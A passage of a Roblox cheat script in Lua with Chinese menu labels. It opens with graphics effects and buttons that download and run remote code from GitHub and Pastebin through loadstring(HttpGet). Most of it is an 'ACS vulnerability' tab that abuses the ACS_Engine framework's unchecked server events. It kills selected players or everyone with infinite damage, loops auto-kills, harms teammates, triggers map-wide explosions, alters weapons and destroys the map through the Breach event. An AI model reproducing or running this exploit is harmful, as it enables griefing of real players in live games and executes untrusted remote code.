            return Color3.fromRGB(230, 245, 220)
        elseif season == "夏季" then
            return Color3.fromRGB(255, 220, 148)
        elseif season == "秋季" then
            return Color3.fromRGB(217, 145, 57)
        elseif season == "冬季" then
            return Color3.fromRGB(210, 225, 240)
        else
            return Color3.fromRGB(230, 245, 220)
        end
    end
    
    local function getSeasonSecondaryTint(season)
        if season == "春季" then
            return Color3.fromRGB(235, 250, 225)
        elseif season == "夏季" then
            return Color3.fromRGB(255, 235, 200)
        elseif season == "秋季" then
            return Color3.fromRGB(255, 247, 239)
        elseif season == "冬季" then
            return Color3.fromRGB(225, 235, 250)
        else
            return Color3.fromRGB(235, 250, 225)
        end
    end
    
    local function applyGraphics()
        clearEffects()
        
        if not Graphics.enabled then
            restoreOriginalSettings()
            return
        end
        
        if Graphics.terrainEnabled and terrain then
            terrain.WaterWaveSize = 0.1
            terrain.WaterWaveSpeed = 22
            terrain.WaterTransparency = 0.9
            terrain.WaterReflectance = 0.05
        end
        
        if Graphics.lightingEnabled then
            lighting.Ambient = Color3.fromRGB(33, 33, 33)
            lighting.Brightness = 5.69
            lighting.ColorShift_Bottom = Color3.fromRGB(0, 0, 0)
            lighting.ColorShift_Top = Color3.fromRGB(255, 247, 237)
            lighting.EnvironmentDiffuseScale = 0.105
            lighting.EnvironmentSpecularScale = 0.522
            lighting.GlobalShadows = true
            lighting.OutdoorAmbient = Color3.fromRGB(51, 54, 67)
            lighting.ShadowSoftness = 0.18
            lighting.GeographicLatitude = -15.525
            lighting.ExposureCompensation = 0.75
        else
            lighting.Ambient = originalLighting.Ambient
            lighting.Brightness = originalLighting.Brightness
            lighting.ColorShift_Bottom = originalLighting.ColorShift_Bottom
            lighting.ColorShift_Top = originalLighting.ColorShift_Top
            lighting.EnvironmentDiffuseScale = originalLighting.EnvironmentDiffuseScale
            lighting.EnvironmentSpecularScale = originalLighting.EnvironmentSpecularScale
            lighting.GlobalShadows = originalLighting.GlobalShadows
            lighting.OutdoorAmbient = originalLighting.OutdoorAmbient
            lighting.ShadowSoftness = originalLighting.ShadowSoftness
            lighting.GeographicLatitude = originalLighting.GeographicLatitude
            lighting.ExposureCompensation = originalLighting.ExposureCompensation
        end
        
        if Graphics.bloomEnabled then
            local bloom = Instance.new("BloomEffect")
            bloom.Parent = lighting
            bloom.Enabled = true
            bloom.Intensity = 0.99
            bloom.Size = 9999
            bloom.Threshold = 0
            table.insert(effectsList, bloom)
            effects.bloom = bloom
        end
        
        local colorCorrection = Instance.new("ColorCorrectionEffect")
        colorCorrection.Parent = lighting
        colorCorrection.Brightness = 0.015
        colorCorrection.Contrast = 0.25
        colorCorrection.Enabled = true
        colorCorrection.Saturation = 0.2
        colorCorrection.TintColor = getSeasonTintColor(Graphics.mode)
        table.insert(effectsList, colorCorrection)
        effects.colorCorrection = colorCorrection
        
        if Graphics.depthOfFieldEnabled then
            local depthOfField = Instance.new("DepthOfFieldEffect")
            depthOfField.Parent = lighting
            depthOfField.Enabled = true
            depthOfField.FarIntensity = 0.077
            depthOfField.FocusDistance = 21.54
            depthOfField.InFocusRadius = 20.77
            depthOfField.NearIntensity = 0.277
            table.insert(effectsList, depthOfField)
            effects.depthOfField = depthOfField
        end
        
        local colorCorrection2 = Instance.new("ColorCorrectionEffect")
        colorCorrection2.Parent = lighting
        colorCorrection2.Brightness = 0
        colorCorrection2.Contrast = -0.07
        colorCorrection2.Saturation = 0
        colorCorrection2.Enabled = true
        colorCorrection2.TintColor = getSeasonSecondaryTint(Graphics.mode)
        table.insert(effectsList, colorCorrection2)
        effects.colorCorrection2 = colorCorrection2
        
        local colorCorrection3 = Instance.new("ColorCorrectionEffect")
        colorCorrection3.Parent = lighting
        colorCorrection3.Brightness = 0.2
        colorCorrection3.Contrast = 0.45
        colorCorrection3.Saturation = -0.1
        colorCorrection3.Enabled = true
        colorCorrection3.TintColor = Color3.fromRGB(255, 255, 255)
        table.insert(effectsList, colorCorrection3)
        effects.colorCorrection3 = colorCorrection3
        
        if Graphics.sunEnabled then
            local sunRays = Instance.new("SunRaysEffect")
            sunRays.Parent = lighting
            sunRays.Enabled = true
            sunRays.Intensity = 0.5
            sunRays.Spread = 0.5
            table.insert(effectsList, sunRays)
            effects.sunRays = sunRays
        end
        
        if Graphics.blurEnabled then
            local blur = Instance.new("BlurEffect")
            blur.Parent = lighting
            blur.Enabled = true
            blur.Size = 6
            table.insert(effectsList, blur)
            effects.blur = blur
        end
    end
    
    local function setMode(mode)
        Graphics.mode = mode
        if Graphics.enabled then
            applyGraphics()
        end
    end
    
    saveOriginalSettings()
    
    _G.GraphicsState = Graphics
    _G.ApplyGraphics = applyGraphics
    _G.SetGraphicsMode = setMode
    
    local graphicsSection = PIJIAOBEN:section("画质", false)
    
    graphicsSection:Toggle("开启/关闭画质增强", "Enable Graphics", false, function(state)
        Graphics.enabled = state
        applyGraphics()
    end)
    
    graphicsSection:Dropdown('季节模式', 'Graphics Mode', {"春季", "夏季", "秋季", "冬季"}, function(value)
        setMode(value)
    end)
    
    graphicsSection:Toggle("地形增强", "Terrain Enhance", false, function(state)
        Graphics.terrainEnabled = state
        if Graphics.enabled then
            applyGraphics()
        end
    end)
    
    graphicsSection:Toggle("光照增强", "Lighting Enhance", false, function(state)
        Graphics.lightingEnabled = state
        if Graphics.enabled then
            applyGraphics()
        end
    end)
    
    graphicsSection:Toggle("Bloom效果", "Bloom Effect", false, function(state)
        Graphics.bloomEnabled = state
        if Graphics.enabled then
            applyGraphics()
        end
    end)
    
    graphicsSection:Toggle("景深效果", "Depth of Field", false, function(state)
        Graphics.depthOfFieldEnabled = state
        if Graphics.enabled then
            applyGraphics()
        end
    end)
    
    graphicsSection:Toggle("太阳光线", "Sun Rays", false, function(state)
        Graphics.sunEnabled = state
        if Graphics.enabled then
            applyGraphics()
        end
    end)
    
    graphicsSection:Toggle("模糊效果", "Blur Effect", false, function(state)
        Graphics.blurEnabled = state
        if Graphics.enabled then
            applyGraphics()
        end
    end)
end)

run(function()
    local Players = game:GetService("Players")
    local LocalPlayer = Players.LocalPlayer
    
    LocalPlayer.CharacterAdded:Connect(function()
        task.wait(1)
        if _G.GraphicsState and _G.GraphicsState.enabled then
            _G.ApplyGraphics()
        end
    end)
end)

local Light = PIJIAOBEN:section("光影", false)

Light:Button("光影", function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/MZEEN2424/Graphics/main/Graphics.xml"))()
end)
Light:Button("光影v4", function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/MZEEN2424/Graphics/main/Graphics.xml"))()
end)
Light:Button("光影浅", function()
  loadstring(game:HttpGet("https://pastebin.com/raw/jHBfJYmS"))()
end)
Light:Button("光影深", function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/MZEEN2424/Graphics/main/Graphics.xml"))()
end)

local acsTab = XIAOPI:Tab("ACS漏洞","136169594232359")

local run = function(func) func() end

run(function()
    _G.ACSConfig = {
        detectedACS = {
            Exists = false,
            Version = "Unknown",
            Events = {},
            Eventos = {},
            HasConfig = false
        },
        breachPower = 3,
        suppressionLoop = nil,
        whizzLoop = nil,
        selectedPlayer = nil,
        autoAttackLoop = nil,
        autoHealLoop = nil,
        autoSuppressLoop = nil,
        autoWhizzLoop = nil,
        autoKillLoop = nil
    }
end)

run(function()
    _G.ACSServices = {
        Players = game:GetService("Players"),
        ReplicatedStorage = game:GetService("ReplicatedStorage"),
        Workspace = game:GetService("Workspace"),
        RunService = game:GetService("RunService"),
        LocalPlayer = game:GetService("Players").LocalPlayer,
        Camera = game:GetService("Workspace").CurrentCamera
    }
end)

run(function()
    local rs = _G.ACSServices.ReplicatedStorage
    local config = _G.ACSConfig
    
    local function detectACS()
        local acs = rs:FindFirstChild("ACS_Engine")
        
        if acs then
            config.detectedACS.Exists = true
            
            local events = acs:FindFirstChild("Events")
            local eventos = acs:FindFirstChild("Eventos")
            
            if events then
                config.detectedACS.Events = {
                    Refil = events:FindFirstChild("Refil") ~= nil,
                    Suppression = events:FindFirstChild("Suppression") ~= nil,
                    Whizz = events:FindFirstChild("Whizz") ~= nil,
                    Damage = events:FindFirstChild("Damage") ~= nil
                }
            end
            
            if eventos then
                config.detectedACS.Eventos = {
                    Damage = eventos:FindFirstChild("Damage") ~= nil,
                    Breach = eventos:FindFirstChild("Breach") ~= nil,
                    Recarregar = eventos:FindFirstChild("Recarregar") ~= nil,
                    ServerBullet = eventos:FindFirstChild("ServerBullet") ~= nil,
                    Suppression = eventos:FindFirstChild("Suppression") ~= nil,
                    Whizz = eventos:FindFirstChild("Whizz") ~= nil,
                    Hit = eventos:FindFirstChild("Hit") ~= nil,
                    Drag = eventos:FindFirstChild("Drag") ~= nil,
                    Atirar = eventos:FindFirstChild("Atirar") ~= nil,
                    DoorEvent = eventos:FindFirstChild("DoorEvent") ~= nil
                }
            end
            
            local success = pcall(function()
                require(acs.GameRules.Config)
            end)
            config.detectedACS.HasConfig = success
            
            if config.detectedACS.Eventos.Damage and config.detectedACS.Eventos.Recarregar then
                config.detectedACS.Version = "1.7.5"
            elseif config.detectedACS.Events.Refil and config.detectedACS.HasConfig then
                config.detectedACS.Version = "2.0.1+"
            elseif eventos and not events then
                config.detectedACS.Version = "1.7.x"
            elseif events and not eventos then
                config.detectedACS.Version = "2.0.x"
            else
                config.detectedACS.Version = "Mixed/Unknown"
            end
        end
        
        return config.detectedACS.Exists
    end
    
    _G.ACSCore = {
        detect = detectACS,
        getDetected = function() return config.detectedACS end
    }
end)

run(function()
    local config = _G.ACSConfig
    local core = _G.ACSCore
    local Players = _G.ACSServices.Players
    local ReplicatedStorage = _G.ACSServices.ReplicatedStorage
    local Workspace = _G.ACSServices.Workspace
    local RunService = _G.ACSServices.RunService
    local Camera = _G.ACSServices.Camera
    local LocalPlayer = _G.ACSServices.LocalPlayer
    local acsTab = acsTab
    
    local function getDamageEvent()
        if config.detectedACS.Eventos.Damage then
            return ReplicatedStorage["ACS_Engine"].Eventos.Damage
        elseif config.detectedACS.Events.Damage then
            return ReplicatedStorage["ACS_Engine"].Events.Damage
        end
        return nil
    end
    
    local function getSuppressionEvent()
        if config.detectedACS.Eventos.Suppression then
            return ReplicatedStorage["ACS_Engine"].Eventos.Suppression
        elseif config.detectedACS.Events.Suppression then
            return ReplicatedStorage["ACS_Engine"].Events.Suppression
        end
        return nil
    end
    
    local function getWhizzEvent()
        if config.detectedACS.Eventos.Whizz then
            return ReplicatedStorage["ACS_Engine"].Eventos.Whizz
        elseif config.detectedACS.Events.Whizz then
            return ReplicatedStorage["ACS_Engine"].Events.Whizz
        end
        return nil
    end
    
    local function getRefilEvent()
        if config.detectedACS.Events.Refil then
            return ReplicatedStorage["ACS_Engine"].Events.Refil
        end
        return nil
    end
    
    local function getRecarregarEvent()
        if config.detectedACS.Eventos.Recarregar then
            return ReplicatedStorage["ACS_Engine"].Eventos.Recarregar
        end
        return nil
    end
    
    local function notify(title, text, duration)
        if XPHUBNotification then
            XPHUBNotification:Notification({
                Title = title,
                Text = text,
                Icon = "rbxassetid://136169594232359",
                Duration = duration or 3
            })
        end
    end
    
    _G.ACSNotify = notify
    
    local checkSection = acsTab:section("状态检测", true)
    local statusLabel = checkSection:Label("检测中...")
    local versionLabel = checkSection:Label("版本: 未知")
    
    checkSection:Button("重新检测", function()
        core.detect()
        if config.detectedACS.Exists then
            statusLabel.Text = "✅ ACS 已检测到"
            versionLabel.Text = "版本: " .. config.detectedACS.Version
        else
            statusLabel.Text = "❌ 未检测到 ACS"
            versionLabel.Text = "版本: N/A"
        end
        notify("系统检测", config.detectedACS.Exists and "ACS " .. config.detectedACS.Version or "无ACS", 3)
    end)
    
    local playerList = {}
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= LocalPlayer then
            table.insert(playerList, p.Name)
        end
    end
    
    Players.PlayerAdded:Connect(function(p)
        if p ~= LocalPlayer then
            table.insert(playerList, p.Name)
        end
    end)
    
    Players.PlayerRemoving:Connect(function(p)
        for i, name in ipairs(playerList) do
            if name == p.Name then
                table.remove(playerList, i)
                break
            end
        end
    end)
    
    local targetSection = acsTab:section("目标玩家操作", false)
    targetSection:Dropdown("选择目标玩家", "acs_target_player", playerList, function(selected)
        config.selectedPlayer = selected
    end)
    
    targetSection:Button("传送到玩家", function()
        if not config.selectedPlayer then return end
        local target = Players:FindFirstChild(config.selectedPlayer)
        if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
            local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
            if hrp then
                hrp.CFrame = target.Character.HumanoidRootPart.CFrame
                notify("传送", "已传送到 " .. target.Name, 2)
            end
        end
    end)
    
    targetSection:Button("击杀选中玩家", function()
        if not config.selectedPlayer then 
            notify("错误", "请先选择一名玩家", 2)
            return 
        end
        local damageEvent = getDamageEvent()
        if not damageEvent then
            notify("错误", "未找到 Damage 事件", 2)
            return
        end
        local target = Players:FindFirstChild(config.selectedPlayer)
        if target and target.Character and target.Character:FindFirstChild("Humanoid") then
            pcall(function()
                damageEvent:FireServer(target.Character.Humanoid, math.huge, 0, 0)
                notify("成功", "已击杀 " .. target.Name, 2)
            end)
        else
            notify("错误", "目标玩家不存在或已死亡", 2)
        end
    end)
    
    targetSection:Button("致残选中玩家 (1HP)", function()
        if not config.selectedPlayer then 
            notify("错误", "请先选择一名玩家", 2)
            return 
        end
        local damageEvent = getDamageEvent()
        if not damageEvent then
            notify("错误", "未找到 Damage 事件", 2)
            return
        end
        local target = Players:FindFirstChild(config.selectedPlayer)
        if target and target.Character and target.Character:FindFirstChild("Humanoid") then
            pcall(function()
                damageEvent:FireServer(target.Character.Humanoid, 1, 0, 0)
                notify("成功", "已将 " .. target.Name .. " 致残至1HP", 2)
            end)
        else
            notify("错误", "目标玩家不存在或已死亡", 2)
        end
    end)
    
    targetSection:Button("治疗选中玩家", function()
        if not config.selectedPlayer then 
            notify("错误", "请先选择一名玩家", 2)
            return 
        end
        local damageEvent = getDamageEvent()
        if not damageEvent then
            notify("错误", "未找到 Damage 事件", 2)
            return
        end
        local target = Players:FindFirstChild(config.selectedPlayer)
        if target and target.Character and target.Character:FindFirstChild("Humanoid") then
            pcall(function()
                damageEvent:FireServer(target.Character.Humanoid, -999999999, 0, 0)
                notify("成功", "已治疗 " .. target.Name, 2)
            end)
        else
            notify("错误", "目标玩家不存在或已死亡", 2)
        end
    end)
    
    targetSection:Button("上帝模式选中玩家", function()
        if not config.selectedPlayer then 
            notify("错误", "请先选择一名玩家", 2)
            return 
        end
        local damageEvent = getDamageEvent()
        if not damageEvent then
            notify("错误", "未找到 Damage 事件", 2)
            return
        end
        local target = Players:FindFirstChild(config.selectedPlayer)
        if target and target.Character and target.Character:FindFirstChild("Humanoid") then
            pcall(function()
                damageEvent:FireServer(target.Character.Humanoid, -math.huge, 0, 0)
                notify("成功", "已为 " .. target.Name .. " 开启上帝模式", 2)
            end)
        else
            notify("错误", "目标玩家不存在或已死亡", 2)
        end
    end)
    
    targetSection:Button("压制选中玩家", function()
        if not config.selectedPlayer then 
            notify("错误", "请先选择一名玩家", 2)
            return 
        end
        local suppressionEvent = getSuppressionEvent()
        if not suppressionEvent then
            notify("错误", "未找到 Suppression 事件", 2)
            return
        end
        local target = Players:FindFirstChild(config.selectedPlayer)
        if target then
            pcall(function()
                suppressionEvent:FireServer(target, 666, 666, 666)
                notify("成功", "已压制 " .. target.Name, 2)
            end)
        end
    end)
    
    targetSection:Button("子弹呼啸选中玩家", function()
        if not config.selectedPlayer then 
            notify("错误", "请先选择一名玩家", 2)
            return 
        end
        local whizzEvent = getWhizzEvent()
        if not whizzEvent then
            notify("错误", "未找到 Whizz 事件", 2)
            return
        end
        local target = Players:FindFirstChild(config.selectedPlayer)
        if target then
            pcall(function()
                whizzEvent:FireServer(target)
                notify("成功", "已对 " .. target.Name .. " 使用子弹呼啸", 2)
            end)
        end
    end)
    
    targetSection:Button("给选中玩家无限弹药", function()
        if not config.selectedPlayer then 
            notify("错误", "请先选择一名玩家", 2)
            return 
        end
        local refilEvent = getRefilEvent()
        local recarregarEvent = getRecarregarEvent()
        local target = Players:FindFirstChild(config.selectedPlayer)
        if target then
            if refilEvent then
                pcall(function()
                    refilEvent:FireServer(target)
                    notify("成功", "已给 " .. target.Name .. " 无限弹药", 2)
                end)
            elseif recarregarEvent then
                pcall(function()
                    recarregarEvent:FireServer(target)
                    notify("成功", "已给 " .. target.Name .. " 无限弹药", 2)
                end)
            else
                notify("错误", "未找到弹药补给事件", 2)
            end
        end
    end)
    
    targetSection:Button("拖拽选中玩家", function()
        local eventos = ReplicatedStorage["ACS_Engine"] and ReplicatedStorage["ACS_Engine"].Eventos
        if not eventos or not eventos.Drag then
            notify("错误", "未找到 Drag 事件", 2)
            return
        end
        local target = Players:FindFirstChild(config.selectedPlayer)
        local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
        if target and hrp then
            pcall(function()
                eventos.Drag:FireServer(target, hrp.Position)
                notify("成功", "已拖拽 " .. target.Name, 2)
            end)
        end
    end)
    
    local attackSection = acsTab:section("全局攻击", false)
    
    attackSection:Button("杀死所有人", function()
        local damageEvent = getDamageEvent()
        if not damageEvent then return end
        local killedCount = 0
        for _, player in ipairs(Players:GetPlayers()) do
            if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild("Humanoid") then
                pcall(function()
                    damageEvent:FireServer(player.Character.Humanoid, math.huge, 0, 0)
                    killedCount = killedCount + 1
                end)
            end
        end
        notify("全局攻击", "已杀死 " .. killedCount .. " 名玩家", 2)
    end)
    
    local autoKillEnabled = false
    attackSection:Toggle("自动秒杀循环", "auto_kill", false, function(state)
        autoKillEnabled = state
        local damageEvent = getDamageEvent()
        if not damageEvent then
            notify("错误", "未找到 Damage 事件", 2)
            return
        end
        if state then
            config.autoKillLoop = task.spawn(function()
                while autoKillEnabled do
                    for _, player in ipairs(Players:GetPlayers()) do
                        if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild("Humanoid") then
                            pcall(function()
                                damageEvent:FireServer(player.Character.Humanoid, math.huge, 0, 0)
                            end)
                        end
                    end
                    task.wait(2)
                end
            end)
            notify("自动秒杀", "已开启自动秒杀循环", 2)
        else
            if config.autoKillLoop then
                task.cancel(config.autoKillLoop)
                config.autoKillLoop = nil
            end
            notify("自动秒杀", "已关闭自动秒杀循环", 2)
        end
    end)
    
    attackSection:Button("杀死所有人(包括自己)", function()
        local damageEvent = getDamageEvent()
        if not damageEvent then return end
        for _, player in ipairs(Players:GetPlayers()) do
            if player.Character and player.Character:FindFirstChild("Humanoid") then
                pcall(function()
                    damageEvent:FireServer(player.Character.Humanoid, math.huge, 0, 0)
                end)
            end
        end
        notify("全局攻击", "已杀死所有玩家(包括你自己)", 2)
    end)
    
    attackSection:Button("致残所有人 (1HP)", function()
        local damageEvent = getDamageEvent()
        if not damageEvent then return end
        for _, player in ipairs(Players:GetPlayers()) do
            if player.Character and player.Character:FindFirstChild("Humanoid") then
                pcall(function()
                    damageEvent:FireServer(player.Character.Humanoid, 1, 0, 0)
                end)
            end
        end
        notify("全局攻击", "已将所有人致残至1HP", 2)
    end)
    
    attackSection:Button("治疗所有人", function()
        local damageEvent = getDamageEvent()
        if not damageEvent then return end
        for _, player in ipairs(Players:GetPlayers()) do
            if player.Character and player.Character:FindFirstChild("Humanoid") then
                pcall(function()
                    damageEvent:FireServer(player.Character.Humanoid, -999999999, 0, 0)
                end)
            end
        end
        notify("全局攻击", "已治疗所有人", 2)
    end)
    
    local autoHealEnabled = false
    attackSection:Toggle("自动治疗循环", "auto_heal", false, function(state)
        autoHealEnabled = state
        local damageEvent = getDamageEvent()
        if not damageEvent then
            notify("错误", "未找到 Damage 事件", 2)
            return
        end
        if state then
            config.autoHealLoop = task.spawn(function()
                while autoHealEnabled do
                    if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
                        pcall(function()
                            damageEvent:FireServer(LocalPlayer.Character.Humanoid, -99999, 0, 0)
                        end)
                    end
                    task.wait(0.5)
                end
            end)
            notify("自动治疗", "已开启自动治疗循环", 2)
        else
            if config.autoHealLoop then
                task.cancel(config.autoHealLoop)
                config.autoHealLoop = nil
            end
            notify("自动治疗", "已关闭自动治疗循环", 2)
        end
    end)
    
    attackSection:Button("治疗队友", function()
        local damageEvent = getDamageEvent()
        if not damageEvent then return end
        local healedCount = 0
        for _, player in ipairs(Players:GetPlayers()) do
            if player.Team == LocalPlayer.Team and player.Character and player.Character:FindFirstChild("Humanoid") then
                pcall(function()
                    damageEvent:FireServer(player.Character.Humanoid, -9999, 0, 0)
                    healedCount = healedCount + 1
                end)
            end
        end
        notify("治疗", "已治疗 " .. healedCount .. " 名队友", 2)
    end)
    
    attackSection:Button("伤害队友", function()
        local damageEvent = getDamageEvent()
        if not damageEvent then return end
        local damagedCount = 0
        for _, player in ipairs(Players:GetPlayers()) do
            if player.Team == LocalPlayer.Team and player ~= LocalPlayer and player.Character and player.Character:FindFirstChild("Humanoid") then
                pcall(function()
                    damageEvent:FireServer(player.Character.Humanoid, 50, 0, 0)
                    damagedCount = damagedCount + 1
                end)
            end
        end
        notify("伤害", "已伤害 " .. damagedCount .. " 名队友", 2)
    end)
    
    attackSection:Button("范围爆炸伤害", function()
        local damageEvent = getDamageEvent()
        if not damageEvent then return end
        local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
        if not hrp then return end
        local killedCount = 0
        for _, player in ipairs(Players:GetPlayers()) do
            if player ~= LocalPlayer and player.Character then
                pcall(function()
                    damageEvent:FireServer(player.Character.Humanoid, 999, 0, 0)
                    killedCount = killedCount + 1
                end)
            end
        end
        notify("范围攻击", "已对全图 " .. killedCount .. " 名玩家造成爆炸伤害", 2)
    end)
    
    attackSection:Button("范围Hit爆炸", function()
        local eventos = ReplicatedStorage["ACS_Engine"] and ReplicatedStorage["ACS_Engine"].Eventos
        if not eventos or not eventos.Hit then
            notify("错误", "未找到 Hit 事件", 2)
            return
        end
        local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
        if hrp then
            local args = {
                hrp.Position,
                Instance.new("Part"),
                Vector3.yAxis,
                Enum.Material.Plastic,
                {
                    ExPressure = 999999,
                    ExpRadius = 100,
                    ExplosiveHit = true,
                    ExplosionDamage = 500
                }
            }
            eventos.Hit:FireServer(unpack(args))
            notify("范围爆炸", "已触发范围Hit爆炸", 2)
        end
    end)
    
    local autoAttackEnabled = false
    attackSection:Toggle("自动攻击循环", "auto_attack", false, function(state)
        autoAttackEnabled = state
        local damageEvent = getDamageEvent()
        if not damageEvent then
            notify("错误", "未找到 Damage 事件", 2)
            return
        end
        if state then
            config.autoAttackLoop = task.spawn(function()
                while autoAttackEnabled do
                    for _, player in ipairs(Players:GetPlayers()) do
                        if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild("Humanoid") then
                            pcall(function()
                                damageEvent:FireServer(player.Character.Humanoid, 50, 0, 0)
                            end)
                        end
                    end
                    task.wait(1)
                end
            end)
            notify("自动攻击", "已开启自动攻击循环", 2)
        else
            if config.autoAttackLoop then
                task.cancel(config.autoAttackLoop)
                config.autoAttackLoop = nil
            end
            notify("自动攻击", "已关闭自动攻击循环", 2)
        end
    end)
    
    attackSection:Button("远程击杀", function()
        local damageEvent = getDamageEvent()
        if not damageEvent then return end
        local camera = Camera
        local target = camera:FindFirstChild("Focus")
        if target and target.Parent and target.Parent.Parent then
            local player = Players:GetPlayerFromCharacter(target.Parent.Parent)
            if player and player ~= LocalPlayer then
                pcall(function()
                    damageEvent:FireServer(player.Character.Humanoid, math.huge, 0, 0)
                    notify("远程击杀", "已击杀 " .. player.Name, 2)
                end)
            end
        end
    end)
    
    local weaponSection = acsTab:section("武器修改 (需装备武器)", false)
    
    weaponSection:Button("一键无敌武器", function()
        local char = LocalPlayer.Character
        if not char then return end
        local tool = char:FindFirstChildOfClass("Tool")
        if not tool then
            notify("错误", "请先装备武器", 2)
            return
        end
        local acsMod = tool:FindFirstChild("ACS_Modulo")
        if acsMod and acsMod:FindFirstChild("Variaveis") then
            pcall(function()
                local settings = require(acsMod.Variaveis.Settings)
                settings.Firerate = 100000
                settings.SuppressMaxDistance = 100
                settings.SuppressTime = 30
                settings.Distance = 1000000
                settings.BDrop = 0.01
                settings.BSpeed = 6000
                settings.BulletPenetration = 100
                settings.FallOfDamage = 0
                settings.MaxSway = 0
                settings.VRecoil = {0, 0}
                settings.HRecoil = {0, 0}
                settings.AimRecover = 0
                settings.RecoilPunch = 0
                settings.VPunchBase = 0
                settings.HPunchBase = 0
                settings.DPunchBase = 0
                settings.MinSpread = 0
                settings.MaxSpread = 0
                notify("武器修改", "已应用无敌配置", 2)
            end)
        end
    end)
    
    weaponSection:Button("一击必杀", function()
        local char = LocalPlayer.Character
        if not char then return end
        local tool = char:FindFirstChildOfClass("Tool")
        if not tool then return end
        local acsMod = tool:FindFirstChild("ACS_Modulo")
        if acsMod and acsMod:FindFirstChild("Variaveis") then
            pcall(function()
                local settings = require(acsMod.Variaveis.Settings)
                settings.HeadDamage = {130, 140}
                settings.TorsoDamage = {130, 140}
                settings.Limbs = {130, 140}
                notify("武器修改", "已应用一击必杀", 2)
            end)
        end
    end)
    
    weaponSection:Button("爆炸子弹", function()
        local char = LocalPlayer.Character
        if not char then return end
        local tool = char:FindFirstChildOfClass("Tool")
        if not tool then return end
        local acsMod = tool:FindFirstChild("ACS_Modulo")
        if acsMod and acsMod:FindFirstChild("Variaveis") then
            pcall(function()
                local settings = require(acsMod.Variaveis.Settings)
                settings.ExplosiveHit = true
                settings.ExPressure = 1000000000000
                settings.ExpRadius = 100000000000
                settings.BulletLightBrightness = 10
                notify("武器修改", "已应用爆炸子弹", 2)
            end)
        end
    end)
    
    weaponSection:Button("无限弹药", function()
        for _, v in pairs(getgc(true)) do
            if type(v) == 'table' and rawget(v, 'Ammo') then
                pcall(function()
                    v.Ammo = 9e9
                    v.StoredAmmo = 9e9
                    v.MaxStoredAmmo = 9e9
                end)
            end
        end
        notify("武器修改", "已应用无限弹药", 2)
    end)
    
    weaponSection:Button("获取所有武器", function()
        local refilEvent = getRefilEvent()
        if refilEvent then
            pcall(function()
                refilEvent:FireServer(LocalPlayer)
                notify("武器", "已获取所有武器", 2)
            end)
        else
            notify("错误", "未找到武器获取事件", 2)
        end
    end)
    
    local configSection = acsTab:section("本地配置 (2.0.1)", false)
    
    configSection:Toggle("无限体力", "acs_stamina", false, function(state)
        if not config.detectedACS.HasConfig then 
            notify("错误", "ACS版本不支持此功能", 2)
            return 
        end
        pcall(function()
            local cfg = require(ReplicatedStorage['ACS_Engine'].GameRules.Config)
            cfg.EnableStamina = not state
        end)
    end)
    
    configSection:Toggle("禁用坠落伤害", "acs_fall", false, function(state)
        if not config.detectedACS.HasConfig then 
            notify("错误", "ACS版本不支持此功能", 2)
            return 
        end
        pcall(function()
            local cfg = require(ReplicatedStorage['ACS_Engine'].GameRules.Config)
            cfg.EnableFallDamage = not state
        end)
    end)
    
    configSection:Toggle("允许连跳", "acs_bhop", false, function(state)
        if not config.detectedACS.HasConfig then 
            notify("错误", "ACS版本不支持此功能", 2)
            return 
        end
        pcall(function()
            local cfg = require(ReplicatedStorage['ACS_Engine'].GameRules.Config)
            cfg.AntiBunnyHop = not state
        end)
    end)
    
    configSection:Toggle("无限子弹", "acs_infinite_ammo", false, function(state)
        if not config.detectedACS.HasConfig then 
            notify("错误", "ACS版本不支持此功能", 2)
            return 
        end
        pcall(function()
            local cfg = require(ReplicatedStorage['ACS_Engine'].GameRules.Config)
            cfg.InfiniteAmmo = state
            notify("配置", state and "已开启无限子弹" or "已关闭无限子弹", 2)
        end)
    end)
    
    configSection:Toggle("无敌模式", "acs_godmode", false, function(state)
        if not config.detectedACS.HasConfig then 
            notify("错误", "ACS版本不支持此功能", 2)
            return 
        end
        pcall(function()
            local cfg = require(ReplicatedStorage['ACS_Engine'].GameRules.Config)
            cfg.GodMode = state
            notify("配置", state and "已开启无敌模式" or "已关闭无敌模式", 2)
        end)
    end)
    
    configSection:Toggle("无限呼吸", "acs_breath", false, function(state)
        if not config.detectedACS.HasConfig then 
            notify("错误", "ACS版本不支持此功能", 2)
            return 
        end
        pcall(function()
            local cfg = require(ReplicatedStorage['ACS_Engine'].GameRules.Config)
            cfg.EnableBreath = not state
        end)
    end)
    
    configSection:Toggle("无限冲刺", "acs_sprint", false, function(state)
        if not config.detectedACS.HasConfig then 
            notify("错误", "ACS版本不支持此功能", 2)
            return 
        end
        pcall(function()
            local cfg = require(ReplicatedStorage['ACS_Engine'].GameRules.Config)
            cfg.EnableSprintStamina = not state
        end)
    end)
    
    local breachSection = acsTab:section("破拆/干扰", false)
    
    breachSection:Slider("破拆强度", "acs_breach", 3, 1, 50, false, function(value)
        config.breachPower = value
    end)
    
    breachSection:Button("位置破拆", function()
        if not config.detectedACS.Eventos.Breach then
            notify("错误", "ACS版本不支持此功能", 2)
            return
        end
        local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
        if hrp then
            pcall(function()
                ReplicatedStorage["ACS_Engine"].Eventos.Breach:FireServer(
                    config.breachPower or 3,
                    {Fortified = {}, Destroyable = Workspace},
                    CFrame.new(),
                    CFrame.new(),
                    {CFrame = hrp.CFrame, Size = {X = 5, Y = 5, Z = 5}}
                )
            end)
        end
    end)
    
    breachSection:Button("全局破拆", function()
        if not config.detectedACS.Eventos.Breach then
            notify("错误", "ACS版本不支持此功能", 2)
            return
        end
        pcall(function()
            ReplicatedStorage["ACS_Engine"].Eventos.Breach:FireServer(
                99,
                {Fortified = {}, Destroyable = Workspace},
                CFrame.new(),
                CFrame.new(),
